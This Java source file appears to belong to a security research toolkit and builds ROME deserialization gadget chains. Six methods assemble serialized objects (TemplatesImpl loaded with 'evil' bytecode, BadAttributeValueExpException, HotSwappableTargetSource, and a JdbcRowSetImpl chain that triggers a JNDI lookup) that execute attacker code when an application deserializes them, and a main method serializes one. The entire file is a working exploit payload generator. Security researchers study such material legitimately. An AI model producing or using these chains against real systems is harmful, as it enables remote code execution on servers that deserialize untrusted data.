package com.yyjccc.rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import com.yyjccc.EvilClass.EvilClassTable;
import com.yyjccc.Utils.Reflect;
import com.yyjccc.Utils.Tool;
import com.yyjccc.javassist.Calc;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.management.BadAttributeValueExpException;
import javax.sql.rowset.BaseRowSet;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.util.HashMap;
import java.util.Hashtable;

public class Rome {
	public static Object Gadget_EqualBean() throws Exception {
		TemplatesImpl templates = new TemplatesImpl();
		Reflect.setValue(templates,"_name","aaa");
		Reflect.setValue(templates,"_bytecodes",new byte[][]{Calc.getCodeByte()});
		Reflect.setValue(templates,"_tfactory",new TransformerFactoryImpl());
		ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
		EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
		HashMap<Object, Object> hashMap = new HashMap<>();
		hashMap.put(equalsBean,"123");
		return hashMap;
	}


	public static Object Gadget_ObjectBean() throws Exception {




		TemplatesImpl templates = new TemplatesImpl();
		Reflect.setValue(templates,"_name","aaa");
		Reflect.setValue(templates,"_bytecodes",new byte[][]{Calc.getCodeByte()});
		Reflect.setValue(templates,"_tfactory",new TransformerFactoryImpl());
		ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
		ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
		HashMap<Object, Object> hashMap = new HashMap<>();
		hashMap.put(objectBean,"123");
		return hashMap;
	}


	public static Object HashTableGadget() throws Exception {
		TemplatesImpl templates = new TemplatesImpl();
		Reflect.setValue(templates,"_name","aaa");
		Reflect.setValue(templates,"_bytecodes",new byte[][]{EvilClassTable.TemplateClass()});
		Reflect.setValue(templates,"_tfactory",new TransformerFactoryImpl());
		ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
		ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
		Hashtable<Object, Object> hashTable = new Hashtable<>();
		hashTable.put(objectBean,123);
		return hashTable;
	}

	public static Object BadAttributeValueExpExceptionGadget()throws Exception{
		TemplatesImpl templates = new TemplatesImpl();
		Reflect.setValue(templates,"_name","aaa");
		Reflect.setValue(templates,"_bytecodes",new byte[][]{EvilClassTable.TemplateClass()});
		Reflect.setValue(templates,"_tfactory",new TransformerFactoryImpl());
		ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
		BadAttributeValueExpException expException = new BadAttributeValueExpException(123);
		Reflect.setValue(expException,"val",toStringBean);
		return expException;
	}


	public static Object HotSwappableTargetSourceGadget()throws Exception{
		TemplatesImpl templates = new TemplatesImpl();
		Reflect.setValue(templates,"_name","aaa");
		Reflect.setValue(templates,"_bytecodes",new byte[][]{EvilClassTable.TemplateClass()});
		Reflect.setValue(templates,"_tfactory",new TransformerFactoryImpl());
		ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
		HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean);
		HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("xxx"));

		HashMap<Object,Object> hashMap = new HashMap<>();
		hashMap.put(h1,h1);
		hashMap.put(h2,h2);

		return hashMap;
	}


	public static Object JdbcRowSetImplGadget(String jndiLocation) throws SQLException, NoSuchFieldException, IllegalAccessException {
		JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
		Reflect.setValue(BaseRowSet.class,jdbcRowSet,"dataSource",jndiLocation);
		ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowSet);
		ObjectBean objectBean = new ObjectBean(ToStringBean.class,toStringBean);
		//Reflect.setValue(objectBean,"_toStringBean",null);
		//Reflect.setValue(objectBean,"_cloneableBean",null);
		HashMap<Object,Object> hashMap = new HashMap<>();
		hashMap.put(objectBean, "aaa");
		return hashMap;
	}



	public static Object getValue(Object obj, String name) throws Exception{
		Field field = obj.getClass().getDeclaredField(name);
		field.setAccessible(true);
		return field.get(obj);
	}
	public static void main(String[] args) {
		try {
			Tool.serialize(Gadget_ObjectBean());
		} catch (Exception e) {
			throw new RuntimeException(e);
		}
	}
}
